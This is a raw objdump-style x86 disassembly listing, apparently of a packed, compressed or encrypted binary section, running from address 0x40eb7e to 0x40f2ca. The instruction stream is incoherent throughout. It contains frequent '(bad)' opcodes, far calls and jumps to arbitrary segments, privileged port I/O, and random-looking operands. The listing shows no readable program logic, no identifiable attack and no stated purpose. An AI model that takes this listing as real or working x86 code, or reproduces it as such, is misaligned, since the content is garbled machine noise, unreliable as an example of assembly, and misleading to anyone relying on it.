  40eb7e:	test   eax,0xf87f75b9
  40eb83:	bound  edi,QWORD PTR [ebx+0x73]
  40eb86:	jne    0x40eb5a
  40eb88:	adc    ecx,esp
  40eb8a:	sub    esi,DWORD PTR [edi-0x6b]
  40eb8d:	fild   QWORD PTR [ecx]
  40eb8f:	or     edi,DWORD PTR [esi-0x86ff291]
  40eb95:	int3   
  40eb96:	mov    edi,0xff5a1385
  40eb9b:	push   edx
  40eb9c:	mov    bl,0x41
  40eb9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb9f:	test   eax,0x83a0e7cc
  40eba4:	sbb    eax,0x8adbcf64
  40eba9:	aad    0xb9
  40ebab:	lods   eax,DWORD PTR ds:[esi]
  40ebac:	and    eax,0x85c56784
  40ebb1:	(bad)  
  40ebb2:	rcr    edx,1
  40ebb4:	jge    0x40eb42
  40ebb6:	gs repz or esi,DWORD PTR ds:[ecx+ebx*2-0x3e63c23]
  40ebc0:	mov    bh,0x63
  40ebc2:	out    dx,al
  40ebc3:	and    al,0xfb
  40ebc5:	mov    ds:0xe0c6bc5,eax
  40ebca:	cmp    edx,DWORD PTR [edx-0x218105ce]
  40ebd0:	dec    ebp
  40ebd1:	mov    eax,ds:0xa8e62d65
  40ebd6:	cli    
  40ebd7:	fnsave ds:0xaaa332f9
  40ebdd:	jnp    0x40ebaa
  40ebdf:	add    eax,0x3eb48ea4
  40ebe4:	out    0x35,al
  40ebe6:	je     0x40eb68
  40ebe8:	call   0xf308:0xc70d5fad
  40ebef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebf0:	mov    BYTE PTR [edx+eax*1-0xf1173c7],ch
  40ebf7:	and    eax,0x81012357
  40ebfc:	dec    esi
  40ebfd:	sbb    cl,BYTE PTR [esp+eax*8-0x2e]
  40ec01:	mov    ecx,0x31e1ba63
  40ec06:	aad    0xd3
  40ec08:	je     0x40ebcf
  40ec0a:	push   cs
  40ec0b:	ror    BYTE PTR [edx-0x37],cl
  40ec0e:	sub    al,0xc3
  40ec10:	cmp    al,0xb4
  40ec12:	add    ecx,DWORD PTR [ebp+0x6e3c8ffb]
  40ec18:	mov    ecx,0x589d2cb7
  40ec1d:	adc    eax,0x430c55ae
  40ec22:	fsubr  QWORD PTR ds:0xe54a3205
  40ec28:	loop   0x40ec00
  40ec2a:	aaa    
  40ec2b:	ins    BYTE PTR es:[edi],dx
  40ec2c:	adc    al,0x4d
  40ec2e:	xor    al,0x61
  40ec30:	retf   0xa4ec
  40ec33:	cld    
  40ec34:	in     eax,dx
  40ec35:	out    dx,eax
  40ec36:	out    0xec,eax
  40ec38:	je     0x40ec88
  40ec3a:	pop    esi
  40ec3b:	out    dx,al
  40ec3c:	arpl   si,di
  40ec3e:	into   
  40ec3f:	scas   eax,DWORD PTR es:[edi]
  40ec40:	push   esi
  40ec41:	and    al,0xba
  40ec43:	inc    esp
  40ec44:	pop    ebp
  40ec45:	mov    esi,0x3238f244
  40ec4a:	xchg   ebx,eax
  40ec4b:	leave  
  40ec4c:	leave  
  40ec4d:	sub    bh,BYTE PTR [eax-0x18]
  40ec50:	repz mov edi,0xb8ebc665
  40ec56:	xor    al,0x3b
  40ec58:	xchg   esi,eax
  40ec59:	cwde   
  40ec5a:	loopne 0x40ec49
  40ec5c:	aad    0xb3
  40ec5e:	xchg   ebx,eax
  40ec5f:	sub    ebp,DWORD PTR [edi-0x2a6cf119]
  40ec65:	lock jns 0x40ec8f
  40ec68:	prefetchwt1 BYTE PTR [edi+0x4d385e74]
  40ec6f:	push   cs
  40ec70:	sbb    al,0x6c
  40ec72:	push   0x80f86bcd
  40ec77:	pop    eax
  40ec78:	sub    edi,DWORD PTR [ecx]
  40ec7a:	xor    al,0x56
  40ec7c:	jmp    0x1929:0x7697ac1e
  40ec83:	ds sahf 
  40ec85:	pop    edi
  40ec86:	div    DWORD PTR [ecx-0x2e]
  40ec89:	mov    esi,0x12dcbb68
  40ec8e:	push   ecx
  40ec8f:	cmc    
  40ec90:	ror    dl,1
  40ec92:	xlat   BYTE PTR ds:[ebx]
  40ec93:	mov    cl,0x4b
  40ec95:	adc    BYTE PTR [edx-0x38],dh
  40ec98:	and    eax,0xe
  40ec9b:	adc    ah,dl
  40ec9d:	add    eax,0x663f5451
  40eca2:	test   DWORD PTR [edx-0x6ed7894c],ecx
  40eca8:	inc    ebx
  40eca9:	sti    
  40ecaa:	fisub  DWORD PTR [ebx+eax*2]
  40ecad:	mov    ebp,eax
  40ecaf:	push   ebp
  40ecb0:	push   es
  40ecb1:	inc    eax
  40ecb2:	lahf   
  40ecb3:	out    0x69,al
  40ecb5:	jmp    0xb75b9734
  40ecba:	dec    esi
  40ecbb:	and    dl,0x2a
  40ecbe:	leave  
  40ecbf:	sub    bh,BYTE PTR ss:[esi-0x79]
  40ecc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecc4:	mov    DWORD PTR [esi+0x7db818c6],ebp
  40ecca:	xor    eax,0xb4f2fcdc
  40eccf:	adc    BYTE PTR [edi],dl
  40ecd1:	ins    BYTE PTR es:[edi],dx
  40ecd2:	outs   dx,DWORD PTR ds:[esi]
  40ecd4:	push   0x3b
  40ecd6:	add    BYTE PTR [edx+0x55415583],ah
  40ecdc:	mov    cl,0xd4
  40ecde:	vaddss xmm3,xmm2,xmm0
  40ece2:	mov    dh,BYTE PTR [ebx-0x68]
  40ece5:	shl    BYTE PTR [ebp+0x501412dd],1
  40eceb:	in     al,dx
  40ecec:	mov    dh,0xdc
  40ecee:	sub    ch,dh
  40ecf0:	xchg   ecx,eax
  40ecf1:	push   eax
  40ecf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecf3:	sub    dh,BYTE PTR ds:0x44d43c85
  40ecf9:	push   ecx
  40ecfa:	leave  
  40ecfb:	and    BYTE PTR [edx+0x7fa0d06a],cl
  40ed01:	test   al,0x26
  40ed03:	rol    BYTE PTR [edi],cl
  40ed05:	(bad)  
  40ed06:	fld    DWORD PTR [edx+0x58]
  40ed09:	inc    eax
  40ed0a:	add    DWORD PTR [ebp-0x740f17d9],esi
  40ed10:	jne    0x40ecd5
  40ed12:	fst    DWORD PTR ds:[ebp+0x25]
  40ed16:	add    edx,DWORD PTR [edx-0x1eec0481]
  40ed1c:	xchg   esp,eax
  40ed1d:	push   cs
  40ed1e:	aam    0xa
  40ed20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed21:	mov    al,0xe1
  40ed23:	pushf  
  40ed24:	pop    ds
  40ed25:	leave  
  40ed26:	lods   eax,DWORD PTR ds:[esi]
  40ed27:	out    0x9d,al
  40ed29:	fbld   TBYTE PTR [edx]
  40ed2b:	inc    ebx
  40ed2c:	lods   al,BYTE PTR ds:[esi]
  40ed2d:	adc    BYTE PTR [eax],cl
  40ed2f:	into   
  40ed30:	mov    dh,0xf5
  40ed32:	clc    
  40ed33:	lahf   
  40ed34:	fwait
  40ed35:	aam    0xcb
  40ed37:	inc    ebx
  40ed38:	cmp    eax,0xc10dc7a
  40ed3d:	aam    0xea
  40ed3f:	pop    ebp
  40ed40:	inc    ecx
  40ed41:	test   BYTE PTR [eax+0x43],ch
  40ed44:	pop    eax
  40ed45:	push   ss
  40ed46:	or     ebp,DWORD PTR [ecx-0xb089a73]
  40ed4c:	push   esp
  40ed4d:	scas   al,BYTE PTR es:[edi]
  40ed4e:	mov    ds:0xb6e645bb,al
  40ed53:	sub    esp,edi
  40ed55:	push   esp
  40ed56:	mov    BYTE PTR [esp+0x3e8e438c],ch
  40ed5d:	mov    bh,0x47
  40ed5f:	test   DWORD PTR [esi-0x4f2f0654],esp
  40ed65:	sub    DWORD PTR [eax-0x5a08c7f5],esp
  40ed6b:	rol    cl,cl
  40ed6d:	add    DWORD PTR [eax+0x6],ebx
  40ed70:	ror    BYTE PTR ds:[ebx+0x73c60721],1
  40ed77:	fisttp WORD PTR [ecx-0x7]
  40ed7a:	(bad)  
  40ed7b:	in     al,dx
  40ed7c:	sahf   
  40ed7d:	fdiv   QWORD PTR [esi-0x12]
  40ed80:	xor    DWORD PTR [ecx],ebx
  40ed82:	jecxz  0x40ed4a
  40ed84:	add    eax,0xc2c07e37
  40ed89:	push   ss
  40ed8a:	std    
  40ed8b:	cmp    al,0x81
  40ed8d:	cmp    esi,DWORD PTR [ebp-0x2d]
  40ed90:	hlt    
  40ed91:	mov    edi,0x730f32fa
  40ed96:	mov    BYTE PTR [edi+0x4ac310ba],dl
  40ed9c:	sti    
  40ed9d:	clc    
  40ed9e:	cdq    
  40ed9f:	popf   
  40eda0:	add    ebp,esi
  40eda2:	fcom   DWORD PTR [ecx+0x2408db71]
  40eda8:	push   esi
  40eda9:	movsx  esi,WORD PTR [ecx]
  40edac:	jle    0x40edd2
  40edae:	mov    gs,WORD PTR [edx]
  40edb0:	jbe    0x40ed4f
  40edb2:	pop    edx
  40edb3:	imul   eax
  40edb5:	adc    al,0xd9
  40edb7:	add    DWORD PTR [edi],eax
  40edb9:	dec    edi
  40edba:	add    ch,BYTE PTR [esi+0x24d011b0]
  40edc0:	leave  
  40edc1:	popa   
  40edc2:	repz rol DWORD PTR [ebp-0x66f8300d],cl
  40edc9:	pushf  
  40edca:	push   ebx
  40edcb:	outs   dx,DWORD PTR ds:[esi]
  40edcc:	jne    0x40edb6
  40edce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edcf:	sti    
  40edd0:	jle    0x40edee
  40edd2:	je     0x40ed68
  40edd4:	popa   
  40edd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edd6:	stos   DWORD PTR es:[edi],eax
  40edd7:	stos   DWORD PTR es:[edi],eax
  40edd8:	jae    0x40edc9
  40edda:	rol    BYTE PTR [ebx+0x7c],1
  40eddd:	xchg   ebp,eax
  40edde:	adc    dl,cl
  40ede0:	in     eax,0xa0
  40ede2:	jo     0x40edf6
  40ede4:	pop    esp
  40ede5:	sbb    BYTE PTR [ecx-0x64d0c0e0],bh
  40edeb:	add    al,0x2d
  40eded:	xor    eax,0x6338ec65
  40edf2:	inc    edx
  40edf3:	add    bh,dh
  40edf5:	jle    0x40ed81
  40edf7:	iret   
  40edf8:	ret    
  40edf9:	call   0xacee:0xf90e6d1a
  40ee00:	sub    al,0xe2
  40ee02:	(bad)  
  40ee03:	sbb    edi,DWORD PTR [esi]
  40ee05:	call   0xe973b1b3
  40ee0a:	inc    ebp
  40ee0b:	sbb    al,0xf6
  40ee0d:	ss jno 0x40ee49
  40ee10:	std    
  40ee11:	in     al,dx
  40ee12:	xchg   esi,eax
  40ee13:	inc    ebx
  40ee14:	pop    esp
  40ee15:	cmp    BYTE PTR [edi+0x33],ch
  40ee18:	xor    bh,BYTE PTR [edx]
  40ee1a:	or     BYTE PTR [edi+eax*8+0x5b],al
  40ee1e:	mov    ds:0xb4815a20,eax
  40ee23:	lods   eax,DWORD PTR ds:[esi]
  40ee24:	sbb    ebx,DWORD PTR [edx+0x79c6e05a]
  40ee2a:	mov    ch,0x6e
  40ee2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee2d:	xchg   BYTE PTR [edi+0x190a32d0],bl
  40ee33:	scas   eax,DWORD PTR es:[edi]
  40ee34:	xor    DWORD PTR [ebp+0x46799f91],0x6c3b433f
  40ee3e:	ja     0x40ee7a
  40ee40:	dec    ebx
  40ee41:	mov    edi,0xb636a92d
  40ee46:	(bad)  
  40ee47:	xchg   edi,eax
  40ee48:	push   0xffffff8b
  40ee4a:	pop    ebp
  40ee4b:	sti    
  40ee4c:	dec    edx
  40ee4d:	mov    al,ds:0x1c41ed8d
  40ee52:	js     0x40ee29
  40ee54:	push   0xffffff85
  40ee56:	sub    ah,BYTE PTR [edx-0x241099d2]
  40ee5c:	aas    
  40ee5d:	out    dx,al
  40ee5e:	xlat   BYTE PTR ds:[ebx]
  40ee5f:	adc    eax,0xc125f079
  40ee64:	sub    al,BYTE PTR [ebx]
  40ee66:	test   BYTE PTR [edi],ah
  40ee68:	cmp    dh,ch
  40ee6a:	stos   BYTE PTR es:[edi],al
  40ee6b:	popa   
  40ee6c:	sub    al,0x7f
  40ee6e:	mov    bh,0x76
  40ee70:	jle    0x40ee3b
  40ee72:	mov    dl,0x43
  40ee74:	into   
  40ee75:	sar    DWORD PTR [edx+0x56a96fb0],1
  40ee7b:	dec    ecx
  40ee7c:	push   es
  40ee7d:	jl     0x40eec0
  40ee7f:	jnp    0x40eef8
  40ee81:	not    BYTE PTR [edx+esi*4-0x7f]
  40ee85:	add    esp,esi
  40ee87:	(bad)  
  40ee88:	jbe    0x40eeb6
  40ee8a:	jb     0x40eecb
  40ee8c:	ffreep st(1)
  40ee8e:	aad    0x87
  40ee90:	jmp    0x44b6b457
  40ee95:	nop
  40ee96:	mov    ebp,0x78bb9aea
  40ee9b:	lods   eax,DWORD PTR ds:[esi]
  40ee9c:	pop    ebp
  40ee9d:	sahf   
  40ee9e:	fadd   QWORD PTR ds:0x786073e1
  40eea4:	das    
  40eea5:	add    eax,0x98a10b70
  40eeaa:	cmp    dh,cl
  40eeac:	sbb    eax,DWORD PTR [ebx-0x32]
  40eeaf:	push   edi
  40eeb0:	outs   dx,BYTE PTR ds:[esi]
  40eeb1:	aam    0x20
  40eeb3:	shr    BYTE PTR [eax*4-0x5935891a],1
  40eeba:	mov    ebp,0xcb45eff2
  40eebf:	fstp   DWORD PTR [esi+edi*8]
  40eec2:	rcr    BYTE PTR [ebp+0x525deaae],cl
  40eec8:	(bad)  
  40eec9:	push   esi
  40eeca:	jp     0x40ee4e
  40eecc:	pop    ds
  40eecd:	out    dx,eax
  40eece:	(bad)  
  40eecf:	jns    0x40ef05
  40eed1:	shr    DWORD PTR [ebx+0x51],cl
  40eed4:	xchg   BYTE PTR [esi+0x63],al
  40eed7:	or     eax,0xc3d43e4
  40eedc:	int3   
  40eedd:	popa   
  40eede:	fstp   DWORD PTR [eax]
  40eee0:	in     al,0x9b
  40eee2:	jg     0x40ef45
  40eee4:	les    edi,FWORD PTR [di+0x6287]
  40eee9:	repnz and eax,0x77fa307e
  40eeef:	test   al,0xde
  40eef1:	mov    DWORD PTR [esi],esp
  40eef3:	out    0x28,eax
  40eef5:	cwde   
  40eef6:	inc    esp
  40eef7:	xchg   BYTE PTR [edi-0x71],bh
  40eefa:	stos   BYTE PTR es:[edi],al
  40eefb:	mov    ds:0xe1c377ab,al
  40ef00:	call   0x84c:0x4ba6c0d7
  40ef07:	add    al,0x4e
  40ef09:	and    eax,0xa03f90c2
  40ef0e:	loope  0x40ef1d
  40ef10:	jo     0x40ef5e
  40ef12:	shl    DWORD PTR [ecx+0x3917a681],cl
  40ef18:	jle    0x40eeee
  40ef1a:	jbe    0x40eec5
  40ef1c:	or     BYTE PTR [ebp-0x1e],dl
  40ef1f:	jno    0x40ef6b
  40ef21:	test   ch,dl
  40ef23:	cmp    al,0x33
  40ef25:	loopne 0x40ef8d
  40ef27:	scas   eax,DWORD PTR es:[edi]
  40ef28:	test   DWORD PTR [ebp-0x7d],esp
  40ef2b:	xchg   ebp,eax
  40ef2c:	xchg   esp,eax
  40ef2d:	and    DWORD PTR [esi],edx
  40ef2f:	dec    edx
  40ef30:	xchg   ecx,eax
  40ef31:	adc    al,0x57
  40ef33:	jns    0x40ef27
  40ef35:	dec    ebp
  40ef36:	xchg   esi,eax
  40ef37:	enter  0x3eb4,0x5d
  40ef3b:	sahf   
  40ef3c:	icebp  
  40ef3d:	loop   0x40eed9
  40ef3f:	mov    ch,0xd0
  40ef41:	cmp    eax,0xad3d73be
  40ef46:	inc    dh
  40ef48:	jmp    0x7a90:0xbae78938
  40ef4f:	int3   
  40ef50:	imul   esp,DWORD PTR [edi],0x28
  40ef53:	call   0x22fe:0x6c17d7c6
  40ef5a:	cmp    dl,bl
  40ef5c:	mov    edi,0xabf56bcf
  40ef61:	stos   DWORD PTR es:[edi],eax
  40ef62:	es jne 0x40ef05
  40ef65:	in     eax,dx
  40ef66:	push   ds
  40ef67:	scas   al,BYTE PTR es:[edi]
  40ef68:	cdq    
  40ef69:	aad    0x6e
  40ef6b:	jbe    0x40ef4d
  40ef6d:	gs shl bl,0xa2
  40ef71:	fiadd  DWORD PTR [ecx-0x30]
  40ef74:	ins    BYTE PTR es:[edi],dx
  40ef75:	call   0x8091:0x9d6ee619
  40ef7c:	jbe    0x40ef49
  40ef7e:	push   esi
  40ef7f:	stc    
  40ef80:	gs aaa 
  40ef82:	repz pop ds
  40ef84:	sub    DWORD PTR ds:0xff25eec9,ecx
  40ef8a:	loop   0x40efad
  40ef8c:	sub    DWORD PTR [esi],0xffffffa0
  40ef8f:	jae    0x40ef8a
  40ef91:	dec    ebp
  40ef92:	and    DWORD PTR [edi*8-0x622a6e26],ecx
  40ef99:	mov    edi,0xd5516750
  40ef9e:	xchg   edi,eax
  40ef9f:	push   es
  40efa0:	and    al,0x6f
  40efa2:	cs int3 
  40efa4:	and    eax,0xf043db51
  40efa9:	push   ebp
  40efaa:	pusha  
  40efab:	adc    al,0x44
  40efad:	sahf   
  40efae:	push   esi
  40efaf:	xor    edx,0xa2c4e7c6
  40efb5:	les    ebp,FWORD PTR [eax+0x68]
  40efb8:	test   al,0x81
  40efba:	xor    dh,BYTE PTR [esi+0x73]
  40efbd:	cmp    ebp,ebx
  40efbf:	pop    ebx
  40efc0:	popf   
  40efc1:	cmp    eax,0xcdee9d51
  40efc6:	(bad)  
  40efc7:	jge    0x40effe
  40efc9:	test   al,0x45
  40efcb:	imul   edi,DWORD PTR [ebx+0x77],0xffffffcb
  40efcf:	adc    edi,edi
  40efd1:	xor    eax,ecx
  40efd3:	jecxz  0x40eff8
  40efd5:	inc    edi
  40efd6:	pop    esp
  40efd7:	jl     0x40efd5
  40efd9:	dec    edx
  40efda:	loop   0x40efcd
  40efdc:	imul   eax,DWORD PTR [ecx-0x70],0x5b
  40efe0:	xlat   BYTE PTR ds:[ebx]
  40efe1:	imul   ebx,DWORD PTR [ebp-0x12132d91],0x6e7964c1
  40efeb:	dec    ecx
  40efec:	and    ch,BYTE PTR [ebp-0xb]
  40efef:	repz push ss
  40eff1:	pop    ebp
  40eff2:	inc    edi
  40eff3:	mov    edx,0x5f3fdbf1
  40eff8:	es out dx,al
  40effa:	mov    ecx,ecx
  40effc:	aam    0x85
  40effe:	fnstsw WORD PTR [eax-0x647428c9]
  40f004:	adc    ecx,edi
  40f006:	xlat   BYTE PTR ds:[ebx]
  40f007:	test   al,0xaa
  40f00a:	cwde   
  40f00b:	not    DWORD PTR [ecx+0x2a]
  40f00e:	in     al,0xbb
  40f010:	cmp    bl,dl
  40f012:	jmp    DWORD PTR [edx-0x6f51f7d3]
  40f018:	cld    
  40f019:	and    BYTE PTR [ecx],al
  40f01b:	(bad)  
  40f01c:	call   0x3455:0xff8ad3b8
  40f023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f024:	aaa    
  40f025:	cli    
  40f026:	dec    ebx
  40f027:	cmc    
  40f028:	dec    esp
  40f029:	or     DWORD PTR [ebx],ebx
  40f02b:	sbb    eax,0x3d40f0ea
  40f030:	sbb    DWORD PTR [edx],esp
  40f032:	repz rcr DWORD PTR [ebp-0x65],1
  40f036:	ja     0x40efd2
  40f038:	push   0xc461257e
  40f03d:	push   es
  40f03e:	arpl   cx,di
  40f040:	cwde   
  40f041:	push   ds
  40f042:	imul   edx,DWORD PTR [ebx+eiz*8+0x28],0x545deb8d
  40f04a:	int3   
  40f04b:	addr16 fcmovnu st,st(3)
  40f04e:	inc    ebp
  40f04f:	fwait
  40f050:	pop    eax
  40f051:	cmp    eax,0xd5f76723
  40f056:	out    0x29,al
  40f058:	cmp    DWORD PTR [edi+0x9],0xffffffab
  40f05c:	dec    ebp
  40f05d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f05e:	push   ss
  40f05f:	inc    edi
  40f060:	xchg   DWORD PTR [ebp+0x63],eax
  40f063:	ret    
  40f064:	mov    dl,0xdf
  40f066:	test   dh,cl
  40f068:	popa   
  40f069:	mov    cl,0x7c
  40f06b:	mov    bl,0xb4
  40f06d:	ins    DWORD PTR es:[edi],dx
  40f06e:	inc    esi
  40f06f:	retf   0xf73
  40f072:	mov    cl,0x92
  40f074:	xchg   ecx,eax
  40f075:	xchg   esp,eax
  40f076:	loop   0x40f0ef
  40f078:	std    
  40f079:	xchg   ecx,eax
  40f07a:	pop    ebp
  40f07b:	in     al,dx
  40f07c:	xchg   ebp,eax
  40f07d:	mov    ecx,?
  40f07f:	int    0x67
  40f081:	stc    
  40f082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f083:	mul    BYTE PTR [esi+0x93cb2f]
  40f089:	add    ebp,DWORD PTR [edi]
  40f08b:	jbe    0x40f035
  40f08d:	pop    esp
  40f08e:	mov    esp,0x7f315c1a
  40f093:	dec    ecx
  40f094:	js     0x40f03d
  40f096:	xchg   ecx,eax
  40f097:	pop    es
  40f098:	lahf   
  40f099:	push   esi
  40f09a:	xor    eax,DWORD PTR [edi]
  40f09c:	or     ebp,DWORD PTR [ebp-0x375bd513]
  40f0a2:	pop    ebp
  40f0a3:	outs   dx,BYTE PTR ds:[esi]
  40f0a4:	out    0x7d,al
  40f0a6:	rol    bh,1
  40f0a8:	ja     0x40f10b
  40f0aa:	leave  
  40f0ab:	mov    ecx,0x5be67f10
  40f0b1:	add    eax,0xb430ad70
  40f0b6:	sbb    eax,0x1426c98c
  40f0bb:	arpl   WORD PTR [ebp-0x23bc75f6],dx
  40f0c1:	mov    ds:0xce3c520f,al
  40f0c6:	fcmovb st,st(0)
  40f0c8:	xor    DWORD PTR [ebx+esi*2-0x33],eax
  40f0cc:	cmp    al,0x3c
  40f0ce:	daa    
  40f0cf:	ja     0x40f07c
  40f0d1:	imul   ecx,DWORD PTR [ebx],0x6b708069
  40f0d7:	outs   dx,BYTE PTR ds:[esi]
  40f0d8:	cs (bad) 
  40f0da:	inc    eax
  40f0db:	nop
  40f0dc:	loop   0x40f066
  40f0de:	mov    ebp,0x1282e4d1
  40f0e3:	pusha  
  40f0e4:	jbe    0x40f0c4
  40f0e6:	iret   
  40f0e7:	mov    ebp,0x622e2993
  40f0ec:	loop   0x40f13b
  40f0ee:	fwait
  40f0ef:	adc    ebx,DWORD PTR [ebp+0x53e8635c]
  40f0f5:	pop    ebx
  40f0f6:	sub    bl,BYTE PTR [ebp+0x6cafbe0f]
  40f0fc:	mov    al,0x14
  40f0fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0ff:	push   ebx
  40f100:	call   0xa1aa:0xc2b70d0e
  40f107:	hlt    
  40f108:	(bad)
  40f10b:	enter  0xa637,0xda
  40f10f:	xchg   ecx,eax
  40f110:	cmp    BYTE PTR [ebx],al
  40f112:	lahf   
  40f113:	fwait
  40f114:	jge    0x40f0eb
  40f116:	imul   ebx,DWORD PTR [eax+0x70f1dcac],0x918ddcd4
  40f120:	sub    al,0x83
  40f122:	pop    DWORD PTR [eax+0x42]
  40f125:	pusha  
  40f126:	jns    0x40f153
  40f128:	ss xchg esp,eax
  40f12a:	and    esp,edx
  40f12c:	pop    es
  40f12d:	call   0xac5f:0xa29d71af
  40f134:	mov    BYTE PTR ds:0x26926631,bh
  40f13a:	ins    DWORD PTR es:[edi],dx
  40f13b:	daa    
  40f13c:	scas   al,BYTE PTR es:[edi]
  40f13d:	push   ss
  40f13e:	inc    esp
  40f13f:	mov    edi,0x51c1cec6
  40f144:	mov    bl,0xbc
  40f146:	cmp    BYTE PTR [edx],ch
  40f148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f149:	adc    dl,BYTE PTR [ebx+0x19]
  40f14c:	loopne 0x40f12d
  40f14e:	xlat   BYTE PTR ds:[ebx]
  40f14f:	rcr    BYTE PTR [esi+ebx*2],1
  40f152:	inc    edx
  40f153:	scas   al,BYTE PTR es:[edi]
  40f154:	push   ss
  40f155:	loopne 0x40f0e0
  40f157:	enter  0x54de,0x38
  40f15b:	dec    ebx
  40f15c:	mul    BYTE PTR [esi+edx*4+0x4d]
  40f160:	icebp  
  40f161:	or     DWORD PTR [ecx+esi*1+0x76f64492],ebp
  40f168:	or     eax,0xca9fb534
  40f16d:	add    al,dh
  40f16f:	jmp    0x6096:0x9a1c9059
  40f176:	rcl    DWORD PTR [ecx+0x3b13295b],cl
  40f17c:	icebp  
  40f17d:	pop    es
  40f17e:	pop    ecx
  40f17f:	push   ds
  40f180:	pop    ds
  40f181:	mov    dh,0xf7
  40f183:	xchg   esp,eax
  40f184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f185:	out    0x48,eax
  40f187:	cmc    
  40f188:	dec    edx
  40f189:	inc    edx
  40f18a:	mov    ebx,0x34d93beb
  40f18f:	cmp    BYTE PTR [esi],cl
  40f191:	dec    esp
  40f192:	fild   DWORD PTR [edx+0x1c]
  40f195:	and    DWORD PTR [eax+0x5f],esi
  40f198:	fidivr DWORD PTR [ebp-0x19]
  40f19b:	in     al,dx
  40f19c:	(bad)  
  40f19d:	aas    
  40f19e:	pop    eax
  40f19f:	lahf   
  40f1a0:	rcl    BYTE PTR ds:0xf847f932,cl
  40f1a6:	cmp    ecx,DWORD PTR [ebx+0x1a]
  40f1a9:	and    bl,BYTE PTR [eax-0x5e]
  40f1ac:	adc    DWORD PTR [edx],edi
  40f1ae:	cmp    eax,0xd9a08cfd
  40f1b3:	ss je  0x40f199
  40f1b6:	mov    dh,0x25
  40f1b8:	push   eax
  40f1b9:	(bad)  
  40f1ba:	xchg   ebx,eax
  40f1bb:	pop    edi
  40f1bc:	and    cl,dh
  40f1be:	push   es
  40f1bf:	pop    ss
  40f1c0:	rol    DWORD PTR [ebx-0x7dff61a7],1
  40f1c6:	xor    BYTE PTR [ebx+edx*4-0x35e5d706],bh
  40f1cd:	jmp    0xa015dfad
  40f1d2:	lock xchg esi,eax
  40f1d4:	test   al,0x42
  40f1d6:	bound  ebp,QWORD PTR [ebx+0x10]
  40f1d9:	fs mov al,0xf1
  40f1dc:	stos   DWORD PTR es:[edi],eax
  40f1dd:	fcmovnu st,st(7)
  40f1df:	mov    ebx,0x47827a50
  40f1e4:	cmp    DWORD PTR [eax-0xa],ebp
  40f1e7:	add    DWORD PTR [ebx+edx*2+0x5a],ebx
  40f1eb:	jne    0x40f1f9
  40f1ed:	mov    cl,0xe
  40f1ef:	mov    eax,cs
  40f1f1:	jg     0x40f179
  40f1f3:	mov    DWORD PTR [esi+0x4ac8fc99],ebp
  40f1f9:	sub    WORD PTR [ecx+0x51],0xff99
  40f1fe:	and    DWORD PTR [eax+ebp*4+0x5],0xc
  40f203:	mov    dl,0xa2
  40f205:	cli    
  40f206:	sub    BYTE PTR [eax+0x34],dl
  40f209:	push   0x2
  40f20b:	addr16 das 
  40f20d:	std    
  40f20e:	mov    ds:0xc6be4e06,al
  40f213:	sbb    esi,0x31
  40f216:	xchg   ecx,eax
  40f217:	push   ebp
  40f218:	rcl    eax,cl
  40f21a:	(bad)  
  40f21b:	(bad)  
  40f21c:	mov    dl,0x72
  40f21e:	or     esi,DWORD PTR [ebx+ecx*2]
  40f221:	call   0xdcad:0x7a32ed8
  40f228:	in     eax,dx
  40f229:	adc    esi,DWORD PTR [edi+0x657833a8]
  40f22f:	enter  0x654c,0x83
  40f233:	mov    al,ds:0xff5e32f9
  40f238:	jnp    0x40f2ab
  40f23a:	sub    esi,ebp
  40f23c:	mov    ecx,0xaac1b7d8
  40f241:	jg     0x40f2a7
  40f243:	aas    
  40f244:	arpl   WORD PTR [ecx],si
  40f246:	push   DWORD PTR [edx]
  40f248:	cdq    
  40f249:	ins    DWORD PTR es:[edi],dx
  40f24a:	jns    0x40f257
  40f24c:	sbb    DWORD PTR [esi+0x27870ff8],esp
  40f252:	js     0x40f2aa
  40f254:	fstp   QWORD PTR [edx-0x1a4e2739]
  40f25a:	sub    ebp,ebp
  40f25c:	pop    esp
  40f25d:	cmp    BYTE PTR [edi+0x2],bh
  40f260:	test   al,0xae
  40f262:	bound  edx,QWORD PTR cs:[esp+edx*8+0x36]
  40f267:	sbb    ah,ah
  40f269:	push   edi
  40f26a:	mov    WORD PTR [edx],ds
  40f26c:	mov    dh,0xd3
  40f26e:	jecxz  0x40f293
  40f270:	retf   
  40f271:	xor    ch,BYTE PTR [edx]
  40f273:	jns    0x40f2b8
  40f275:	push   0xce1faf62
  40f27a:	jbe    0x40f2d6
  40f27c:	outs   dx,BYTE PTR ds:[esi]
  40f27d:	int    0xad
  40f27f:	repnz pop es
  40f281:	in     al,dx
  40f282:	pop    ds
  40f283:	sahf   
  40f284:	xor    BYTE PTR [ebp+0x27],dh
  40f287:	imul   eax,DWORD PTR [eax+0x3acaca72],0x62
  40f28e:	cld    
  40f28f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f290:	test   BYTE PTR [edx-0x3e82e4d5],dh
  40f296:	xchg   ecx,eax
  40f297:	fwait
  40f298:	loop   0x40f28d
  40f29a:	addr16 aaa 
  40f29c:	cs dec edi
  40f29e:	rol    BYTE PTR [edi-0x26],0xdc
  40f2a2:	mov    esi,0x69a845f2
  40f2a7:	in     eax,dx
  40f2a8:	xor    BYTE PTR [edi-0x7b],cl
  40f2ab:	call   0x1c1d:0x48bad283
  40f2b2:	xchg   edi,eax
  40f2b3:	rol    eax,cl
  40f2b5:	or     ch,BYTE PTR [ebp+0x3ab78de4]
  40f2bb:	imul   ebx,DWORD PTR [esi],0xe4227380
  40f2c1:	pop    es
  40f2c2:	fcmovnb st,st(1)
  40f2c4:	call   0xe7d328d6
  40f2c9:	(bad)  
  40f2ca:	retf   0xe7e3
